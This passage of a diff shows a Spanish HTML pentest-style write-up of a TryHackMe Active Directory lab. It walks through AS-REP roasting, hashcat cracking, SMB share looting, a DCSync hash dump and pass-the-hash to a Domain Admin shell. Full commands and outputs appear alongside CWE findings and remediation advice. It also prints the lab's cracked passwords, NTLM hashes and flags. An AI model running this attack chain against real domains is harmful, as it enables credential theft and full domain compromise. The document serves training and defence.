+  cut -d@ -f1 | sort -u > valid_users.txt
 
-$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:<HASH>:<span class="cmd-value">management2005</span>
-Status: Cracked</pre>
-</div>
+cat valid_users.txt
+administrator
+backup
+darkstar
+james
+ori
+paradox
+robin
+<span class="cmd-value">svc-admin</span></pre>
 
-```
-  <div class="attack-step">
-    <div class="step-num">Paso 04 · Enumeration</div>
-    <div class="step-title">Enumeración SMB y acceso al share "backup"</div>
-    <p class="step-desc">Con las credenciales de svc-admin se enumeraron los shares accesibles. El share <strong>backup</strong> estaba accesible y contenía el fichero <code>backup_credentials.txt</code> con credenciales codificadas en Base64.</p>
-    <pre><span class="cmd-tool">smbclient</span> <span class="cmd-flag">-L</span> //10.10.181.132 <span class="cmd-flag">-U</span> <span class="cmd-value">svc-admin%management2005</span>
-```
+        <div class="callout callout-warn">
+          <strong>F-06 · Medium · CWE-203 — Kerberos User Enumeration</strong><br>
+          Este comportamiento es intrínseco al protocolo Kerberos y no puede deshabilitarse sin romper la funcionalidad. Sin embargo, se puede detectar monitorizando Event ID 4768 (AS Request) con volumen anómalo, e implementar rate limiting en el puerto 88 a nivel de red o firewall.
+        </div>
+      </div>
+    </section>
 
-Sharename   Type   Comment
-ADMIN$      Disk   Remote Admin
-<span class="cmd-value">backup</span>      Disk
-C$          Disk   Default share
+    <!-- AS-REP -->
+    <section class="section" id="asrep">
+      <div class="section-label">03 — Exploitation</div>
+      <h2>AS-REP Roasting — Hash sin contraseña previa</h2>
 
-<span class="cmd-tool">smbclient</span> //10.10.181.132/backup <span class="cmd-flag">-U</span> <span class="cmd-value">svc-admin%management2005</span>
-smb: > ls
-backup_credentials.txt   A   48
-smb: > get backup_credentials.txt</pre>
-</div>
+      <div class="attack-step">
+        <div class="step-num">Fase 03 · AS-REP Roasting</div>
+        <div class="step-title">Explotando UF_DONT_REQUIRE_PREAUTH en svc-admin</div>
+        <p class="step-desc">Kerberos pre-authentication es el mecanismo que impide que alguien solicite un ticket cifrado para una cuenta sin primero demostrar que conoce su contraseña. Cuando este mecanismo está desactivado (flag <code>UF_DONT_REQUIRE_PREAUTH</code> en el objeto de usuario AD), el KDC devuelve directamente un AS-REP cifrado con la clave derivada de la contraseña del usuario — sin verificar si el solicitante conoce esa clave.</p>
+        <p class="step-desc">Esto significa que cualquier atacante en la red puede pedir ese AS-REP para cuentas con este flag activo, y luego intentar crackear el hash offline. El ataque se llama AS-REP Roasting (análogo a Kerberoasting pero para pre-auth deshabilitada).</p>
+        <p class="step-desc">Uso <code>GetNPUsers.py</code> de Impacket con la lista de usuarios válidos que obtuve antes:</p>
 
-```
-  <div class="attack-step">
-    <div class="step-num">Paso 05 · Credential Access</div>
-    <div class="step-title">Decodificación de credenciales Base64</div>
-    <p class="step-desc">El fichero <code>backup_credentials.txt</code> contenía credenciales de la cuenta privilegiada <strong>backup</strong> codificadas en Base64 — sin ningún cifrado real. Un simple decode reveló las credenciales en texto claro.</p>
-    <pre>$ cat backup_credentials.txt
-```
+        <pre><span class="cmd-tool">python3 GetNPUsers.py</span> spookysec.local/ \
+    <span class="cmd-flag">-usersfile</span> valid_users.txt \
+    <span class="cmd-flag">-no-pass</span> \
+    <span class="cmd-flag">-dc-ip</span> 10.10.X.X \
+    <span class="cmd-flag">-outputfile</span> hashes.txt
 
-YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
+Impacket v0.11.0 - Copyright 2023 Fortra
 
-$ echo ‘YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw’ | base64 -d
+[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
+<span class="cmd-value">$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a62a1f7d5c5e47f...</span>
+<span class="cmd-comment">  [hash completo guardado en hashes.txt]</span></pre>
+
+        <p class="step-desc">Bingo. Solo <code>svc-admin</code> tiene la pre-autenticación deshabilitada. El hash obtenido tiene el formato <code>$krb5asrep$23$...</code> — el <code>23</code> indica etype RC4-HMAC, el tipo más crackeable. Si fuera etype 18 (AES256) tardaría mucho más en crackear.</p>
+
+        <div class="callout callout-warn">
+          <strong>F-01 · High · CWE-287 — CVSS 8.1 — AS-REP Roasting</strong><br>
+          La pre-autenticación Kerberos debería estar habilitada en TODAS las cuentas sin excepción. Si una aplicación legacy requiere este flag desactivado, la cuenta debería tener una contraseña de al menos 25 caracteres generada aleatoriamente y rotada periódicamente. Auditar con: <code>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}</code>
+        </div>
+      </div>
+    </section>
+
+    <!-- HASHCAT -->
+    <section class="section" id="hashcat">
+      <div class="section-label">04 — Credential Access</div>
+      <h2>Hashcat — Cracking offline del hash AS-REP</h2>
+
+      <div class="attack-step">
+        <div class="step-num">Fase 04 · Offline Hash Cracking</div>
+        <div class="step-title">Recuperando la contraseña de svc-admin con rockyou.txt</div>
+        <p class="step-desc">El hash AS-REP está cifrado con RC4-HMAC usando la contraseña del usuario como clave. El cracking offline consiste en probar contraseñas candidatas, derivar la clave correspondiente y ver si descifra correctamente el hash. Con una GPU moderna y rockyou.txt (14 millones de contraseñas), este proceso dura segundos para contraseñas débiles.</p>
+        <p class="step-desc">Hashcat usa el modo <code>18200</code> para hashes AS-REP Roasting:</p>
+
+        <pre><span class="cmd-tool">hashcat</span> <span class="cmd-flag">-m</span> <span class="cmd-value">18200</span> hashes.txt /usr/share/wordlists/rockyou.txt \
+        <span class="cmd-flag">--force</span>
+
+hashcat (v6.2.6) starting...
+
+Host memory required for this attack: 1 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a62a1f7d5c...:
+<span class="cmd-value">management2005</span>
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Time.Started.....: Tue Feb 07 2026
+Time.Estimated...: Tue Feb 07 2026 (00:00:08)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Speed.#1.........: 1200.0 kH/s (8.35ms)
+Recovered........: 1/1 (100.00%) Digests</pre>
+
+        <p class="step-desc">8 segundos. La contraseña <code>management2005</code> es trivialmente débil — un año + una palabra de diccionario. Esto confirma que las políticas de contraseñas del dominio no son lo suficientemente estrictas. Tengo credenciales válidas: <code>svc-admin:management2005</code>.</p>
+
+        <div class="callout">
+          <strong>Por qué importa el tipo de cifrado</strong><br>
+          RC4-HMAC (etype 23) es el tipo de cifrado más débil soportado por Kerberos, heredado de Windows 2000. Si el dominio estuviera configurado para requerir AES128/AES256 (<code>msDS-SupportedEncryptionTypes</code>), el hash sería mucho más difícil de crackear. En entornos modernos se debería deshabilitar RC4 cuando sea posible.
+        </div>
+      </div>
+    </section>
+
+    <!-- SMB -->
+    <section class="section" id="smb">
+      <div class="section-label">05 — Enumeration</div>
+      <h2>SMB — Enumeración de shares con svc-admin</h2>
+
+      <div class="attack-step">
+        <div class="step-num">Fase 05 · Authenticated SMB Enumeration</div>
+        <div class="step-title">Descubrimiento del share "backup" y su contenido</div>
+        <p class="step-desc">Con credenciales válidas, enumero los shares accesibles. SMB signing estaba activo pero eso no nos impide hacer enumeración autenticada — solo bloquea los ataques de relay.</p>
+
+        <pre><span class="cmd-comment"># Listar shares con credenciales de svc-admin</span>
+<span class="cmd-tool">smbclient</span> <span class="cmd-flag">-L</span> //10.10.X.X <span class="cmd-flag">-U</span> <span class="cmd-value">svc-admin%management2005</span>
+
+  Sharename     Type    Comment
+  ---------     ----    -------
+  ADMIN$        Disk    Remote Admin
+  <span class="cmd-value">backup</span>        Disk
+  C$            Disk    Default share
+  IPC$          IPC     Remote IPC
+  NETLOGON      Disk    Logon server share
+  SYSVOL        Disk    Logon server share</pre>
+
+        <p class="step-desc">Hay un share no estándar: <code>backup</code>. El nombre es muy sugerente en el contexto de un pentest AD — las cuentas de backup suelen tener permisos de replicación, y los shares de backup suelen contener datos sensibles. Accedo:</p>
+
+        <pre><span class="cmd-tool">smbclient</span> //10.10.X.X/backup <span class="cmd-flag">-U</span> <span class="cmd-value">svc-admin%management2005</span>
+
+smb: \> ls
+  .                      D        0  Sat Apr  4 19:08:39 2020
+  ..                     D        0  Sat Apr  4 19:08:39 2020
+  <span class="cmd-value">backup_credentials.txt</span> A       48  Sat Apr  4 19:08:53 2020
+
+8247551 blocks of size 4096, 3567263 blocks available
+
+smb: \> get backup_credentials.txt
+getting file \backup_credentials.txt of size 48</pre>
+
+        <p class="step-desc">El fichero pesa 48 bytes — muy pequeño. Probablemente un token o credenciales codificadas. Lo descargo para analizarlo.</p>
+
+        <div class="callout callout-warn">
+          <strong>F-03 · High · CWE-732 — Share "backup" con permisos excesivos</strong><br>
+          El share <code>backup</code> era accesible por <code>svc-admin</code>, una cuenta de servicio de aplicación sin relación con la función de backup. Aplicar el principio de mínimo privilegio a shares SMB es fundamental: solo las cuentas con necesidad legítima deberían tener acceso.
+        </div>
+      </div>
+    </section>
+
+    <!-- BACKUP CREDS -->
+    <section class="section" id="backup">
+      <div class="section-label">06 — Credential Access</div>
+      <h2>backup_credentials.txt — Credenciales en Base64</h2>
+
+      <div class="attack-step">
+        <div class="step-num">Fase 06 · Credential Recovery</div>
+        <div class="step-title">Decodificando las credenciales de la cuenta backup</div>
+        <p class="step-desc">Abro el fichero descargado. El contenido es claramente Base64 — esa combinación de caracteres alfanuméricos con padding de <code>=</code> es inconfundible:</p>
+
+        <pre>$ cat backup_credentials.txt
+<span class="cmd-value">YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw</span></pre>
+
+        <pre><span class="cmd-comment"># Decodificar Base64</span>
+$ echo 'YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw' | base64 -d
 <span class="cmd-value">backup@spookysec.local:backup2517860</span></pre>
-</div>
 
-```
-  <div class="attack-step">
-    <div class="step-num">Paso 06 · Domain Compromise</div>
-    <div class="step-title">DCSync attack con secretsdump.py</div>
-    <p class="step-desc">La cuenta <strong>backup</strong> tenía permisos <em>Replicating Directory Changes</em> sobre el dominio, suficiente para simular el comportamiento de un DC y volcar todo el NTDS.dit via DRSUAPI. Se obtuvieron los hashes NTLM de todos los usuarios incluyendo el Domain Administrator.</p>
-    <pre><span class="cmd-tool">python3 secretsdump.py</span> <span class="cmd-flag">-just-dc</span> backup@10.10.181.132
-```
+        <p class="step-desc">Las credenciales de <code>backup@spookysec.local</code> en texto claro, solo "cifradas" con Base64 — que no es cifrado, es solo codificación. Cualquier persona con acceso al share (que ya de por sí era demasiado permisivo) obtiene las credenciales de la cuenta <code>backup</code>.</p>
+        <p class="step-desc">Ahora la pregunta clave: ¿qué puede hacer la cuenta <code>backup</code> en el dominio? Las cuentas de backup frecuentemente tienen permisos de replicación de directorio (<code>DS-Replication-Get-Changes</code> y <code>DS-Replication-Get-Changes-All</code>) necesarios para hacer copias del Active Directory. Esos permisos son exactamente los que se necesitan para un ataque DCSync.</p>
 
-Password: backup2517860
+        <div class="callout callout-warn">
+          <strong>F-02 · High · CWE-521 — Credenciales expuestas en share SMB</strong><br>
+          Almacenar credenciales en un fichero de red — aunque sea codificado en Base64 — es equivalente a dejarlo en texto claro para cualquiera con acceso al share. Las credenciales privilegiadas deben almacenarse en soluciones dedicadas como CyberArk, HashiCorp Vault o al menos Windows Credential Manager con protección DPAPI.
+        </div>
+      </div>
+    </section>
 
-[*] Dumping Domain Credentials via DRSUAPI
-Administrator:500:aad3b435b51404ee:<span class="cmd-value">0e0363213e37b94221497260b0bcb4fc</span>:::
-Guest:501:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404ee:0938c1580796561bc1d3161a2f76dcc2:::
-svc-admin:1103:aad3b435b51404ee:<span class="cmd-value">fc0f1e5359e372aa1f69147375ba6809</span>:::
-backup:1118:aad3b435b51404ee:19741bde08a5b52a566697e0c1e9a64c:::</pre>
-</div>
+    <!-- DCSYNC -->
+    <section class="section" id="dcsync">
+      <div class="section-label">07 — Domain Compromise</div>
+      <h2>DCSync — Volcado del NTDS.dit completo</h2>
 
-```
-  <div class="attack-step">
-    <div class="step-num">Paso 07 · Full Compromise</div>
-    <div class="step-title">Pass-the-Hash → Domain Admin shell (Evil-WinRM)</div>
-    <p class="step-desc">Con el hash NTLM del Administrator se autenticó directamente via Evil-WinRM sin necesitar la contraseña en texto claro. Técnica Pass-the-Hash — el dominio SPOOKYSEC.LOCAL quedó completamente comprometido.</p>
-    <pre><span class="cmd-tool">evil-winrm</span> <span class="cmd-flag">-i</span> 10.10.181.132 <span class="cmd-flag">-u</span> Administrator <span class="cmd-flag">-H</span> <span class="cmd-value">0e0363213e37b94221497260b0bcb4fc</span>
-```
+      <div class="attack-step">
+        <div class="step-num">Fase 07 · DCSync Attack</div>
+        <div class="step-title">Simulando un DC con secretsdump.py para volcar todos los hashes</div>
+        <p class="step-desc">DCSync es una técnica que abusa del protocolo de replicación de Active Directory (MS-DRSR). Cuando un DC necesita sincronizarse con otro, usa el mecanismo DRSUAPI para solicitar los datos de directorio, incluyendo los hashes de contraseñas. Si una cuenta tiene los permisos <code>Replicating Directory Changes</code> y <code>Replicating Directory Changes All</code>, puede simular ser un DC y solicitar esa misma información.</p>
+        <p class="step-desc"><code>secretsdump.py</code> de Impacket implementa DCSync. Con las credenciales de <code>backup</code>:</p>
+
+        <pre><span class="cmd-tool">python3 secretsdump.py</span> <span class="cmd-flag">-just-dc</span> backup@10.10.X.X
+
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password: <span class="cmd-value">backup2517860</span>
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+
+<span class="cmd-value">Administrator</span>:500:aad3b435b51404eeaad3b435b51404ee:<span class="cmd-value">0e0363213e37b94221497260b0bcb4fc</span>:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0938c1580796561bc1d3161a2f76dcc2:::
+spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071d1c518:::
+<span class="cmd-value">spookysec.local\svc-admin</span>:1103:aad3b435b51404eeaad3b435b51404ee:<span class="cmd-value">fc0f1e5359e372aa1f69147375ba6809</span>:::
+<span class="cmd-value">spookysec.local\backup</span>:1118:aad3b435b51404eeaad3b435b51404ee:<span class="cmd-value">19741bde08a5b52a566697e0c1e9a64c</span>:::
+[...]
+
+[*] KERBEROS keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:...
+Administrator:aes128-cts-hmac-sha1-96:...
+[*] Cleaning up...</pre>
+
+        <p class="step-desc">Todos los hashes NTLM del dominio, incluyendo el hash del Administrator: <code>0e0363213e37b94221497260b0bcb4fc</code>. Con este hash puedo autenticarme como Administrator en cualquier sistema del dominio usando Pass-the-Hash — sin necesitar crackear la contraseña.</p>
+
+        <div class="callout callout-warn">
+          <strong>F-03 · High · CWE-732 — DCSync rights en cuenta backup</strong><br>
+          Los permisos <code>DS-Replication-Get-Changes</code> y <code>DS-Replication-Get-Changes-All</code> deben estar limitados exclusivamente a objetos Domain Controller y soluciones de backup legítimas debidamente auditadas. Detectar con Event ID 4662 (acceso a objeto con GUID de replicación) o con BloodHound buscando DCSync principals.
+        </div>
+      </div>
+    </section>
+
+    <!-- PASS THE HASH -->
+    <section class="section" id="pth">
+      <div class="section-label">08 — Full Compromise</div>
+      <h2>Pass-the-Hash — Domain Administrator sin conocer la contraseña</h2>
+
+      <div class="attack-step">
+        <div class="step-num">Fase 08 · Pass-the-Hash</div>
+        <div class="step-title">Evil-WinRM con el hash NTLM del Administrator</div>
+        <p class="step-desc">Pass-the-Hash (PtH) es una técnica que aprovecha el hecho de que el protocolo NTLM no requiere la contraseña en texto claro para autenticarse — acepta directamente el hash. En WinRM (que soporta autenticación NTLM), esto significa que puedo obtener una shell como Administrator usando solo el hash, sin necesidad de crackear nada.</p>
+
+        <pre><span class="cmd-tool">evil-winrm</span> <span class="cmd-flag">-i</span> 10.10.X.X \
+           <span class="cmd-flag">-u</span> Administrator \
+           <span class="cmd-flag">-H</span> <span class="cmd-value">0e0363213e37b94221497260b0bcb4fc</span>
+
+Evil-WinRM shell v3.9
+
+Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
 <span class="cmd-value">spookysec\administrator</span>
 
+*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
+<span class="cmd-value">AttacktiveDirectory</span></pre>
+
+        <pre><span class="cmd-comment"># Recoger flags</span>
+*Evil-WinRM* PS C:\Users\svc-admin\Desktop> type user.txt.txt
+<span class="cmd-value">TryHackMe{K3rb3r0s_Pr3_4uth}</span>
+
+*Evil-WinRM* PS C:\Users\backup\Desktop> type PrivEsc.txt
+<span class="cmd-value">TryHackMe{B4ckM3UpSc0tty!}</span>
+
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
 <span class="cmd-value">TryHackMe{4ctiveD1rectoryM4st3r}</span></pre>
-</div>
 
-```
-</section>
+        <p class="step-desc">Dominio comprometido. Con acceso a Administrator, tengo control total: puedo crear cuentas, modificar GPOs, acceder a cualquier sistema del dominio, y persistir de múltiples formas (Golden Ticket con el hash de krbtgt, cuentas backdoor, etc.).</p>
 
-<!-- FINDINGS -->
-<section class="section" id="findings">
-  <div class="section-label">04 — Findings</div>
-  <h2>Hallazgos Técnicos</h2>
-  <table class="findings-table">
-    <thead>
-      <tr>
-        <th>#</th>
-        <th>Severidad</th>
-        <th>Hallazgo</th>
-        <th>CVSS 3.1</th>
-        <th>CWE</th>
-      </tr>
-    </thead>
-    <tbody>
-      <tr>
-        <td>F-01</td>
-        <td><span class="severity sev-high">High</span></td>
-        <td>AS-REP Roasting — Kerberos pre-auth deshabilitado (svc-admin)</td>
-        <td>8.1</td>
-        <td>CWE-287</td>
-      </tr>
-      <tr>
-        <td>F-02</td>
-        <td><span class="severity sev-high">High</span></td>
-        <td>Credenciales débiles de cuenta de servicio (management2005)</td>
-        <td>8.8</td>
-        <td>CWE-521</td>
-      </tr>
-      <tr>
-        <td>F-03</td>
-        <td><span class="severity sev-high">High</span></td>
-        <td>Share "backup" con credenciales en texto claro (Base64)</td>
-        <td>8.8</td>
-        <td>CWE-732</td>
-      </tr>
-      <tr>
-        <td>F-04</td>
-        <td><span class="severity sev-high">High</span></td>
-        <td>Re-uso del hash Domain Admin → Pass-the-Hash universal</td>
-        <td>9.0</td>
-        <td>CWE-255</td>
-      </tr>
-      <tr>
-        <td>F-05</td>
-        <td><span class="severity sev-high">High</span></td>
-        <td>Contraseñas débiles en múltiples cuentas AD (rockyou wordlist)</td>
-        <td>8.1</td>
-        <td>CWE-521</td>
-      </tr>
-      <tr>
-        <td>F-06</td>
-        <td><span class="severity sev-medium">Medium</span></td>
-        <td>Enumeración anónima de usuarios via Kerberos (kerbrute)</td>
-        <td>5.3</td>
-        <td>CWE-203</td>
-      </tr>
-      <tr>
-        <td>F-07</td>
-        <td><span class="severity sev-info">Info</span></td>
-        <td>Sin capacidad de detección/respuesta durante todo el ataque</td>
-        <td>—</td>
-        <td>CWE-693</td>
-      </tr>
-    </tbody>
-  </table>
-</section>
+        <div class="callout">
+          <strong>Sobre la mitigación de Pass-the-Hash</strong><br>
+          PtH es difícil de eliminar completamente porque es una característica del protocolo NTLM. Las mitigaciones más efectivas: desplegar Microsoft LAPS para contraseñas únicas en cada equipo, habilitar Protected Users security group para cuentas privilegiadas (fuerza Kerberos y deshabilita NTLM para esas cuentas), e implementar Credential Guard en Windows 10/2016+ para proteger los hashes en memoria.
+        </div>
+      </div>
+    </section>
 
-<!-- CREDENCIALES -->
-<section class="section" id="creds">
-  <div class="section-label">05 — Credentials</div>
-  <h2>Credenciales Obtenidas</h2>
-  <div class="creds-box">
-    <span class="cred-label"># svc-admin — AS-REP Roasting + hashcat</span><br>
-    <span class="cred-user">svc-admin</span> : <span class="cred-pass">management2005</span><br><br>
-    <span class="cred-label"># backup — Base64 decode desde SMB share</span><br>
-    <span class="cred-user">backup@spookysec.local</span> : <span class="cred-pass">backup2517860</span><br><br>
-    <span class="cred-label"># Administrator — NTLM hash via DCSync (Pass-the-Hash)</span><br>
-    <span class="cred-user">Administrator</span> : <span class="cred-pass">0e0363213e37b94221497260b0bcb4fc</span> (NTLM)
-  </div>
-</section>
+    <!-- FINDINGS -->
+    <section class="section" id="findings">
+      <div class="section-label">09 — Findings</div>
+      <h2>Hallazgos Técnicos</h2>
+      <table class="findings-table">
+        <thead>
+          <tr><th>#</th><th>Severidad</th><th>Hallazgo</th><th>CVSS 3.1</th><th>CWE</th><th>MITRE</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>1</td><td><span class="severity sev-high">High</span></td>
+            <td>AS-REP Roasting — svc-admin con pre-auth Kerberos deshabilitada</td>
+            <td>8.1</td><td>CWE-287</td><td>T1558.004</td>
+          </tr>
+          <tr>
+            <td>2</td><td><span class="severity sev-high">High</span></td>
+            <td>Contraseña débil en cuenta de servicio svc-admin (management2005)</td>
+            <td>8.8</td><td>CWE-521</td><td>T1110.002</td>
+          </tr>
+          <tr>
+            <td>3</td><td><span class="severity sev-high">High</span></td>
+            <td>Share "backup" accesible con credenciales de backup en Base64</td>
+            <td>8.8</td><td>CWE-732</td><td>T1552.001, T1003.003</td>
+          </tr>
+          <tr>
+            <td>4</td><td><span class="severity sev-high">High</span></td>
+            <td>Hash de Administrator reutilizado como admin local (Pass-the-Hash)</td>
+            <td>9.0</td><td>CWE-255</td><td>T1550.002</td>
+          </tr>
+          <tr>
+            <td>5</td><td><span class="severity sev-high">High</span></td>
+            <td>Contraseñas débiles en múltiples cuentas de dominio (NTLM crackeables)</td>
+            <td>8.1</td><td>CWE-521</td><td>T1110.002</td>
+          </tr>
+          <tr>
+            <td>6</td><td><span class="severity sev-medium">Medium</span></td>
+            <td>Enumeración de usuarios de dominio vía Kerberos (sin autenticación)</td>
+            <td>5.3</td><td>CWE-203</td><td>T1087.002</td>
+          </tr>
+          <tr>
+            <td>7</td><td><span class="severity sev-info">Info</span></td>
+            <td>Ausencia total de capacidades de detección y respuesta (SIEM/EDR)</td>
+            <td>—</td><td>CWE-693</td><td>—</td>
+          </tr>
+        </tbody>
+      </table>
+    </section>
 
-<!-- REMEDIATION -->
-<section class="section" id="remediation">
-  <div class="section-label">06 — Remediation</div>
-  <h2>Resumen de Remediación</h2>
-  <ul>
-    <li><strong>[Inmediata]</strong> Habilitar Kerberos pre-authentication en todas las cuentas — auditar con <code>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}</code></li>
-    <li><strong>[Inmediata]</strong> Resetear contraseñas de svc-admin y backup a passphrases aleatorias de 25+ caracteres</li>
-    <li><strong>[Inmediata]</strong> Eliminar backup_credentials.txt del share — usar HashiCorp Vault o CyberArk para credenciales privilegiadas</li>
-    <li><strong>[Inmediata]</strong> Reset completo de contraseñas de todos los usuarios del dominio; doble reset de krbtgt para invalidar tickets Kerberos</li>
-    <li><strong>[Corto plazo]</strong> Desplegar Microsoft LAPS para passwords locales únicos en todos los endpoints</li>
-    <li><strong>[Corto plazo]</strong> Auditar DCSync rights con BloodHound — eliminar Replicating Directory Changes de cuentas no-DC</li>
-    <li><strong>[Corto plazo]</strong> Política de contraseñas: mínimo 12 caracteres + complejidad + auditoría con DSInternals</li>
-    <li><strong>[Largo plazo]</strong> SIEM con alertas en Event ID 4768 (AS-REP sin pre-auth), 4662 (DCSync), 4625 (autenticación fallida)</li>
-    <li><strong>[Largo plazo]</strong> Privileged Access Workstations (PAWs) para actividad administrativa</li>
-  </ul>
-</section>
+    <!-- CREDS -->
+    <section class="section" id="creds">
+      <div class="section-label">10 — Credentials & Flags</div>
+      <h2>Credenciales Obtenidas</h2>
+      <div class="creds-box">
+        <span class="cred-label"># svc-admin — AS-REP Roasting + hashcat -m 18200</span><br>
+        <span class="cred-user">svc-admin</span> : <span class="cred-pass">management2005</span><br><br>
+        <span class="cred-label"># backup — Texto claro en backup_credentials.txt (Base64 decoded)</span><br>
+        <span class="cred-user">backup</span> : <span class="cred-pass">backup2517860</span><br><br>
+        <span class="cred-label"># Administrator — NTLM hash via DCSync (secretsdump.py)</span><br>
+        <span class="cred-user">Administrator</span> NTLM: <span class="cred-pass">0e0363213e37b94221497260b0bcb4fc</span>
+      </div>
+      <div class="creds-box">
+        <span class="cred-label"># Flags</span><br>
+        svc-admin flag → <span class="cred-pass">TryHackMe{K3rb3r0s_Pr3_4uth}</span><br>
+        backup flag    → <span class="cred-pass">TryHackMe{B4ckM3UpSc0tty!}</span><br>
+        root.txt       → <span class="cred-pass">TryHackMe{4ctiveD1rectoryM4st3r}</span>
+      </div>
+    </section>
 
-<!-- TOOLS -->
-<section class="section" id="tools">
-  <div class="section-label">07 — Tools</div>
-  <h2>Herramientas Utilizadas</h2>
-  <ul>
-    <li><strong>kerbrute v1.0.3</strong> — Enumeración de usuarios Kerberos sin autenticación</li>
-    <li><strong>Impacket GetNPUsers.py</strong> — AS-REP Roasting y obtención de hash Kerberos</li>
-    <li><strong>hashcat v6.1.1</strong> — Cracking offline del hash AS-REP (modo 18200)</li>
-    <li><strong>smbclient</strong> — Enumeración de shares SMB y recuperación de ficheros</li>
-    <li><strong>Impacket secretsdump.py</strong> — DCSync y volcado de NTDS.dit</li>
-    <li><strong>Evil-WinRM v3.3</strong> — Shell remota via WinRM con Pass-the-Hash</li>
-  </ul>
-  <div class="tag-row">
-    <span class="tag">Active Directory</span>
-    <span class="tag">Kerberos</span>
-    <span class="tag">AS-REP Roasting</span>
-    <span class="tag">DCSync</span>
-    <span class="tag">Pass-the-Hash</span>
-    <span class="tag">SMB</span>
-    <span class="tag">NTDS.dit</span>
-    <span class="tag">TryHackMe</span>
-    <span class="tag">Black-box</span>
-    <span class="tag">T1558.004</span>
-    <span class="tag">T1003.003</span>
-    <span class="tag">T1550.002</span>
-  </div>
-</section>
+    <!-- REMEDIATION -->
+    <section class="section" id="remediation">
+      <div class="section-label">11 — Remediation</div>
+      <h2>Resumen de Remediación</h2>
+      <ul>
+        <li><strong>[Inmediata]</strong> Resetear contraseñas de <code>svc-admin</code> y <code>backup</code> a passphrases de 25+ caracteres generadas aleatoriamente. Forzar reset de todos los usuarios del dominio dado el volcado completo del NTDS.dit.</li>
+        <li><strong>[Inmediata]</strong> Invalidar todos los tickets Kerberos actuales reseteando la contraseña de <code>krbtgt</code> dos veces (con intervalo de 10 horas entre resets).</li>
+        <li><strong>[Inmediata]</strong> Habilitar Kerberos pre-autenticación en <code>svc-admin</code> y auditar todas las cuentas con <code>DoesNotRequirePreAuth</code> activo.</li>
+        <li><strong>[Corto plazo]</strong> Eliminar el fichero <code>backup_credentials.txt</code> del share. Restringir acceso al share <code>backup</code> solo a las cuentas que lo necesiten explícitamente. Auditar permisos de todos los shares.</li>
+        <li><strong>[Corto plazo]</strong> Auditar y eliminar permisos DCSync de cualquier cuenta que no sea un Domain Controller o solución de backup documentada. BloodHound puede identificar todos los principals con DCSync rights.</li>
+        <li><strong>[Medio plazo]</strong> Desplegar Microsoft LAPS para garantizar contraseñas de admin local únicas en cada equipo. Esto rompe la cadena de Pass-the-Hash lateral.</li>
+        <li><strong>[Medio plazo]</strong> Implementar Fine-Grained Password Policy (FGPP) para cuentas de servicio: mínimo 25 caracteres, complejidad máxima, rotación periódica.</li>
+        <li><strong>[Medio plazo]</strong> Usar Lithnet Password Protection o DSInternals para bloquear contraseñas presentes en bases de datos de brechas y realizar auditorías periódicas de calidad de contraseñas.</li>
+        <li><strong>[Largo plazo]</strong> Desplegar SIEM con alertas en: Event ID 4768 tipo 0x0 (AS-REP sin pre-auth), Event ID 4662 con GUID de replicación (DCSync), Event ID 4624 Logon Type 3 con hash (PtH). Implementar EDR en todos los endpoints.</li>
+      </ul>
+      <div class="tag-row">
+        <span class="tag">Active Directory</span>
+        <span class="tag">Kerberos</span>
+        <span class="tag">AS-REP Roasting</span>
+        <span class="tag">kerbrute</span>
+        <span class="tag">hashcat</span>
+        <span class="tag">SMB Enumeration</span>
+        <span class="tag">DCSync</span>
+        <span class="tag">NTDS.dit</span>
+        <span class="tag">Pass-the-Hash</span>
+        <span class="tag">Evil-WinRM</span>
+        <span class="tag">TryHackMe</span>
+        <span class="tag">T1558.004</span>
+        <span class="tag">T1003.003</span>
+        <span class="tag">T1550.002</span>
+      </div>
 
-<!-- BOTTOM NAV -->
-<div class="writeup-nav-bottom">
-  <a class="nav-link-btn" href="../index.html">← Volver al inicio</a>
-  <a class="nav-link-btn next-page" href="overwatch.html">Siguiente: Overwatch HTB →</a>
-</div>
-```
+      <div class="writeup-nav-bottom">
+        <a class="nav-link-btn" href="index.html">← Volver al inicio</a>
+        <a class="nav-link-btn next-page" href="overwatch.html">Siguiente: Overwatch HTB →</a>
